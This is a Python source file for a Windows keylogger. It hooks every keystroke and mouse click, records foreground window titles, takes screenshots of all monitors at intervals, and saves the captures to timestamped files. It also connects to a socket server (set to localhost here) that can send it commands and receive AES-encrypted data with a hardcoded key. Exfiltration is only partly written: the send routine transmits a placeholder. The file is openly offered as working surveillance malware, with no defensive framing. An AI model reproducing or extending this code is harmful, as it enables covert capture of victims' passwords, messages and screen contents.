# -*- coding: utf-8 -*-
import keyboard
import mouse
import time
import pyautogui
import hashlib
import Crypto.Cipher.AES as aes
from threading import Thread
from socket import socket
from datetime import datetime, timedelta
from PIL import ImageGrab
from functools import partial
from screeninfo import get_monitors
from win32gui import GetWindowText, GetForegroundWindow


class Keylogger:
    def __init__(self, log_interval, window_interval, reconnect_interval):
        self.active = False
        self.connected = False
        self.filecounter = 0

        self.log_interval = log_interval
        self.log = ""

        self.window_interval = window_interval
        self.foreground_window = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

        self.reconnect_interval = reconnect_interval
        self.sock = socket()
        self.host = "127.0.0.1"
        self.port = 1005

        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)

    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_left_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"

    def mouse_right_callback(self):
        self.log += f"[R_CLICK, {mouse.get_position()}]"

    def write_keylogs_to_file(self, foreground_window):
        if self.log:
            with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
                file.write((
                        f"Foreground Window: {foreground_window}\n"
                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Filecounter: {self.filecounter}\n"
                        f"------------------------\n\n"
                        f"{self.log}"
                    ))

            self.start_time = datetime.now()
        self.log = ""

    def write_information_file(self):
        with open(f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
            file.write((
                    f"Monitors: {get_monitors()}\n"
                ))

    def make_screenshot(self):
        pyautogui.screenshot(f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png")

    def check_foreground_window(self):
        while self.active:
            current_window = GetWindowText(GetForegroundWindow())
            timenow = datetime.now()

            if current_window != self.foreground_window:
                self.write_keylogs_to_file(self.foreground_window)
                self.make_screenshot()
                self.foreground_window = current_window
                self.filecounter = 0

            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
                self.end_time = timenow
                self.write_keylogs_to_file(current_window)
                self.make_screenshot()
                self.filecounter += 1

            time.sleep(self.window_interval)

    def connect_to_host(self):
        while not self.connected:
            try:
                self.sock.connect((self.host, self.port))
                self.connected = True
            except:
                self.connected = False
                time.sleep(self.reconnect_interval)

    def send_to_host(self, data):
        encrypted_data = self.encrypt(data)

        try:
            self.sock.sendall(encrypted_data)
        except:
            self.connected = False
            self.connect_to_host()

    def send_keylog_files_to_host(self):
        self.send_to_host(b'data')

    def encrypt(self, fileName):
        openFile = open(".\client.py", "r")
        fileContent = bytes(openFile.read(), encoding = "utf-8")
        #key = hashlib.sha256(fileContent).hexdigest().encode("utf8")[4:20]
        key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
        cipher = aes.new(key, aes.MODE_EAX)
        nonce = cipher.nonce

        if(fileName[-4:] == ".txt"):
            file = open(fileName, "r")
            fileData = file.read().encode("ascii")
        elif(fileName[-4:] == ".png"):
            file = open(fileName, "rb")
            fileData = file.read()
        else:
            fileData = fileName

        cipherText, tag = cipher.encrypt_and_digest(fileData)
        return nonce + tag + cipherText

    def decrypt(self, cipherText):
        key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
        sNonce = cipherText[:16]
        sTag = cipherText[16:32]
        cipher = aes.new(key, aes.MODE_EAX, nonce = sNonce)
        plainText = cipher.decrypt(cipherText[32:])
        try:
            cipher.verify(sTag)
            return plainText
        except:
            return "Message corrupted."

    def start(self):
        self.active = True
        self.write_information_file()

        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_left_callback)
        mouse.on_right_click(callback=self.mouse_right_callback)

        foreground_window_thread = Thread(target=self.check_foreground_window)
        foreground_window_thread.start()

        self.connect_to_host()

        while True:
            recv = self.decrypt(self.sock.recv(1024))
            if recv:
                recv = str(recv)[2:-1]

                if recv == "exit":
                    self.send_to_host(b'terminating')
                    self.sock.close()
                    self.active = False
                    break
                elif recv == "send":
                    self.send_keylog_files_to_host()
                else:
                    self.send_to_host(b'received')
                    print(recv)

if __name__ == "__main__":
    keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
    keylogger.start()
